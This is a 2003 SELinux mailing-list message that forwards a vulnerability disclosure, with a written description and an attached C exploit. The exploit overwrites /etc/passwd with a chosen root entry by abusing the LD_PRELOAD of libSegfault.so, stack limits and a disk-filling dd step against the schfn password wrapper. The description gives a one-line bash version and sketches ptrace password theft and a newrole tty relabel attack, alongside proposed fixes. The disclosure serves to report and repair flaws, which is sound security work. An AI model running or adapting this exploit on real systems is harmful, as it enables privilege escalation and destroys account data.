Received: from jazzband.ncsc.mil (jazzband.ncsc.mil [144.51.5.4])
	by tycho.ncsc.mil (8.12.8/8.12.8) with ESMTP id h569tdI4002359
	for <selinux@tycho.nsa.gov>; Fri, 6 Jun 2003 05:55:40 -0400 (EDT)
Received: from jazzband.ncsc.mil (localhost [127.0.0.1])
	by jazzband.ncsc.mil  with ESMTP id h569tctV003352
	for <selinux@tycho.nsa.gov>; Fri, 6 Jun 2003 09:55:38 GMT
Received: from sentry.rv.nailabs.com (sentry.rv.nailabs.com [204.254.155.100])
        by jazzband.ncsc.mil  with ESMTP id h569tcal003349 for <selinux@tycho.nsa.gov>; Fri, 6 Jun 2003 09:55:38 GMT
Received: from localhost (wsalamon@localhost)
	by vox.rv.nailabs.com (8.11.2/8.11.2) with ESMTP id h569tXt10657
	for <selinux@tycho.nsa.gov>; Fri, 6 Jun 2003 05:55:33 -0400
Date: Fri, 6 Jun 2003 05:55:33 -0400 (EDT)
From: Wayne Salamon <wsalamon@nailabs.com>
To: <selinux@tycho.nsa.gov>
Subject: Re: A vulnerability in SELinux (fwd)
Message-ID: <Pine.LNX.4.33.0306060554430.10200-300000@vox.rv.nailabs.com>
MIME-Version: 1.0
Content-Type: MULTIPART/Mixed; BOUNDARY=r5Pyd7+fXNt84Ff3
Sender: owner-selinux@tycho.nsa.gov
List-Id: selinux@tycho.nsa.gov

  This message is in MIME format.  The first part should be readable text,
  while the remaining parts are likely unreadable without MIME-aware tools.
  Send mail to mime@docserver.cac.washington.edu for more info.

--r5Pyd7+fXNt84Ff3
Content-Type: TEXT/PLAIN; CHARSET=US-ASCII
Content-ID: <Pine.LNX.4.33.0306060554432.10200@vox.rv.nailabs.com>
Content-Disposition: INLINE

  Here's the reply from Rafal with the details on the SELinux exploit.

-- 
Wayne Salamon
wsalamon@nailabs.com

---------- Forwarded message ----------
Date: Thu, 5 Jun 2003 09:49:35 -0700
From: Rafal Wojtczuk <rafal@intruvert.com>
To: Wayne Salamon <wsalamon@nailabs.com>
Cc: cvance@nailabs.com
Subject: Re: A vulnerability in SELinux

On Thu, Jun 05, 2003 at 07:20:13AM -0400, Wayne Salamon wrote:
> > I would like to disclose to you a certain, IMHO significant, security
> > vulnerability in SELinux. Pls let me know whether you prefer me to follow up
>   Please forward any info you have to me and Chris Vance. Plain email is
> fine.

The description and the exploit code in the attachments. Eager to hear some
comments :)

Regards,
Rafal Wojtczuk

--r5Pyd7+fXNt84Ff3
Content-Type: TEXT/PLAIN; CHARSET=iso-8859-2
Content-ID: <Pine.LNX.4.33.0306060554433.10200@vox.rv.nailabs.com>
Content-Description: 
Content-Disposition: ATTACHMENT; FILENAME="description.txt"

Selinux vulnerabilities
Rafal Wojtczuk
rafal_wojtczuk@nai.com

All the tests were done using selinux-2003040709.tgz,
lsm-2.5-2003040709.tgz, default policy, applied to redhat 8.0 distribution.

I. Main vulnerability description
II. Attack description
III. Solutions
IV. Misc

I. 
	An user in the security context anyuser:user_r:user_t, who has
uid=0, can overwrite /etc/passwd with arbitrary content.

II.
	In the default install, there are at least two kinds of binaries which 
are directly executable by an unprivileged user, and which run with high 
privilege. They are:
1) newrole
2) set of password management binaries wrappers

	If an user can take control over any of them, he can subvert all 
selinux security mechanisms. In case of 1) compromise, attacker can directly 
change his security context; in case of 2) compromise, attacker can alter 
passwords of all users.
	The history of unix security teaches us that parent process can
influence a privileged child in many ways. Too many, to consider "grant
privileges via execve" solution secure. Therefore, in some Linux 
distributions (e.g. Owl), there is no setuid binaries - and it can be done 
without loss of functionality.
	It must be observed that once an attacker gains euid=0 (which
selinux is not interested in protecting against) many restrictions
implemented in dynamic linker are waived. This gives an attacker additional
attack vectors.
	Ad rem. The following command, issued by an user with
anyuser:user_r:user_t security context, which has uid=0, will result in 
overwriting /etc/passwd with junk:
# bash -c "ulimit -s 10000; LD_PRELOAD=/lib/libSegfault.so
	SEGFAULT_USE_ALTSTACK=true SEGFAULT_OUTPUT_NAME=/etc/passwd
	/usr/local/selinux/bin/schfn dummyarg"
How does it work ? /lib/libSegfault.so is successfully preloaded - as it
resides in /lib, it was labeled with the security context of 
system_u:object_r:shlib_t. The .init section of libSegfault.so executes, which 
installs a handler for SIGSEGV. Then schfn starts execution. As the stack size 
is made low, it segfaults quickly. The signal handler from libSegfault.so 
happily overwrites SEGFAULT_OUTPUT_NAME with data similar to the following:
*** Segmentation fault
Register dump:

 EAX: 00000000   EBX: 4212a2d0   ECX: 421261e8   EDX: 4212aa58
 ESI: 40012020   EDI: bffffb54   EBP: bffffb08   ESP: bffffb00

 EIP: 08048304   EFLAGS: 00000286

 CS: 0073   DS: 007b   ES: 007b   FS: 0000   GS: 0000   SS: 007b

 Trap: 0000000e   Error: 00000006   OldMask: 00000000
 ESP/signal: bffffb00   CR2: 00000000

Backtrace:
./schfn(__libc_start_main+0xd0)[0x8048304]
./schfn(__libc_start_main+0xa4)[0x420158d4]
./schfn(__libc_start_main+0x31)[0x8048265]

	The attached file (selinux-exploit.c) is a code which utilizes some 
advanced tricks to overwrite /etc/passwd with arbitrary content. It is done 
by manipulating available disk space; this may look like a race condition, 
but thanks to the technique used (LD_DEBUG output throttling) there is no 
race indeed. This allows an attacker to log in as an arbitrary user, and then 
use newrole (if it is permitted on the tty) to get the sysadm_r role.

III.
	It may look like the properties of libSegfault.so are just an
unfortunate accident; but as mentioned before, the real problem is in the
design. In the example above, the privileged child inherits:
a) altered environment, including dynamic linker variables
b) altered resource limits
additionally, the attached code:
c) changes argv[0] in order to write user-controlled data to /etc/passwd
d) preloads additional variables, in order to easily control the flow of
	execution via throttling LD_DEBUG output.
None of the above should be possible on a secure system.
	Additionally, let's observe that "schfn" wrapper does very little to
protect the wrapped binary. If there is some buffer overflow in /usr/bin/chfn,
which can be triggered with, say, an environment variable, an attacker can
alter passwords again.
	The short term solution, against this particular vulnerability,
would be to link password management binaries wrappers statically. However, 
other domain transitions still remain at risk. Two long term solution
against this particular vulnerability are possible:
1) use a password management scheme which does not require highly privileged
helpers. tcb suite is a good step (but it allowes ordinary users to update 
/etc/shadow only, not /etc/passwd).
2) wrap password management securely; preferably run (over a unix 
domain socket) a daemon, which will accept and verify username and then
perform desired operation.

	This solution should be accompanied by the removal of "newrole" binary. 
Let's see what happens in the default policy (that is, sshd cannot
transition to sysadm_t directly) if an attacker compromises an sshd process 
(the parent one, not the chrooted one; parent/chrooted in terms of sshd 
privilege separation). He can ptrace the main sshd process, and then setup a 
fake sshd server in order to hijack users' passwords. Even if sshd domain is 
denied ptrace totally (even ptrace calls which are not  privileged), the 
attacker can obtain a security context of user U, who can execute newrole to 
get sysadm_r role. The attacker then waits for U to log in, attaches to any 
process spawned by U's login shell(***) with ptrace, and executes a program 
which proxies standard input to a shell spawned as a subprocess. This way, 
passwords can be stealed almost invisibly. So, sshd compromise is fatal; 
therefore it is more secure to grant sshd the right for transition to other 
domains, and get rid of "newrole" binary.
	Even better solution would be to run two sshd daemons, listening on 
two different ports, one in user_t, the othen in sysadm_t. This has
additional benefits, like firewall access control to the sshd which allows
sysadm to log in.
(***) It would be more logical and straightforward to attach to the login
shell directly, but the dumpable flag is not cleared through execve_secure ? 

IV.
1) spasswd.c:68
  passwd_argv = malloc( (argc + 1) * sizeof(char *) );

It is an integer overflow bug; luckily, not exploitable now, but sooner or
later large number of arguments will be allowed by the kernel.

2) newrole.c:538
    /* Cleanup TTY Context */
    chsid(ttyn,tty_sid);
This code assumes that at line 538 "ttyn" is still the controlling tty for the
user with sid tty_sid. It is a risky assumption, at least in case of
/dev/tty? devices. If an attacker can log on tty1, he can run "newrole" to
his own role, leave the child process suspended, log out, wait for another
user U to log in on tty1, than terminate newrole's child. Newrole will
relabel tty1, now used by U, with attacker's sid.


--r5Pyd7+fXNt84Ff3
Content-Type: TEXT/PLAIN; CHARSET=iso-8859-2
Content-ID: <Pine.LNX.4.33.0306060554434.10200@vox.rv.nailabs.com>
Content-Description: 
Content-Disposition: ATTACHMENT; FILENAME="selinux-exploit.c"

/*
* selinux-2003040709 exploit, by Nergal
* you will probably need to tune it to make it work
* warning, this code may truncate /etc/passwd to 0 length
*/
#include <sys/resource.h>
#include <stdio.h>
#include <strings.h>
#define PIPESIZE 4096
#define LIB1 "/lib/libnss_files.so.2"
#define LIB2 "/lib/libnss_dns.so.2"
#define LIB3 "/lib/libnss_nis.so.2"
#define LIB4 "/lib/libnss_nisplus.so.2"

//#define FILENAME "./passwd"
//#define BINARY "./schfn"
//#define FILLME "./"

#define FILENAME "/etc/passwd"
#define BINARY "/usr/local/selinux/bin/schfn"
#define FILLME "/tmp/"

void child()
{
	char *env[5] = {
		"There is no law beyond do what thou wilt.",
		"SEGFAULT_USE_ALTSTACK=true",
		"SEGFAULT_OUTPUT_NAME=" FILENAME,
		"LD_DEBUG=symbols",
		0
	};
	int limit = 17000, i;
	struct rlimit mylimit = { limit, limit };
	char *root = "/lib/..";
	static char longroot[1024];
	static char ld_preload[10000];

	longroot[0] = 0;
	for (i = 0; i < 1000 / strlen(root); i++)
		strcat(longroot, root);
	sprintf(ld_preload, "LD_PRELOAD=%s" "/lib/libSegFault.so:"
		"%s" LIB1 ":%s" LIB2 ":%s" LIB3 ":%s" LIB4,
		longroot, longroot, longroot, longroot, longroot);
	env[0] = ld_preload;
	setrlimit(RLIMIT_STACK, &mylimit);
	execle(BINARY, "root:anyhashhere:0:0:root:/root:/bin/bash\n",
	       "anyarg", 0, env);
	perror("execle");
	exit(1);
}
void action(int x)
{
	fprintf(stderr, "action %d\n", x);
	if (x == 0) {
		system
		    ("echo filling up; dd if=/dev/zero of="
		    	FILLME "fillme; read x");
// looks like Linux ext3 EFULL semantics is really, really weird
//		sync();
//		sleep(1);
	}    
	else if (x == 1) {
		system("echo removing; rm " FILLME "fillme; read x");
		sync();
		sleep(1);
	}

}

void reader(int fd)
{
	char buf[PIPESIZE+1];
	int state = 0;
	char * ptr;
	char *strings[] = { "write", "backtrace", "waitingforeof" };
	memset(buf, 0, sizeof(buf));
	while (state < 3) {
		int n = read(fd, buf, PIPESIZE);
		if (n <= 0) {
			fprintf(stderr, "read returned %d in state %s\n",
				n, strings[state]);
			exit(1);
		}
		buf[n]=0;
		if (ptr=strstr(buf, strings[state])) {
			fprintf(stderr, "last read:%.60s\n", ptr);
			action(state);
			state++;
		}
	}
}
void disclaimer()
{
	printf("\n");
	printf("warning: this code can damage your /etc/passwd,\n");
	printf("which may make your system unusable;\n");
	printf("you have to understand and modify the code to make it work\n");
	printf("you need to have anyuser:user_r:user_t context AND uid=0 to run this code\n");
	printf("\n");
	exit(0);
}


main(int argc, char **argv)
{
	int fd[2];
	int i;
	
	disclaimer();
	pipe(fd);
	if (!fork()) {
		if (argc!=2) {
			dup2(fd[1], 2);
			close(fd[1]);
		}
		close(fd[0]);
		child();
	}
	close(fd[1]);
	reader(fd[0]);
}

--r5Pyd7+fXNt84Ff3--

--
This message was distributed to subscribers of the selinux mailing list.
If you no longer wish to subscribe, send mail to majordomo@tycho.nsa.gov with
the words "unsubscribe selinux" without quotes as the message.
